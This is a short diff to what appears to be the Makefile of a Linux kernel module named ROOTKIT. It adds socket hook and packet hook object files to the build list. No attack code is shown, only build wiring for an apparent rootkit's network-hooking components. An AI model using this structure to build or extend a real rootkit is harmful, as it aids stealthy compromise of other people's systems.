@@ -14,6 +14,8 @@ BUILDDIR	    := $(MODULEDIR)/build
 $(ROOTKIT)-y 	+= src/main.o
 $(ROOTKIT)-y 	+= src/networking.o
 $(ROOTKIT)-y 	+= src/sockets.o
+$(ROOTKIT)-y 	+= src/socket/hook.o
+$(ROOTKIT)-y 	+= src/socket/packet_hook.o
 
 # Module output
 obj-m           := $(ROOTKIT).o
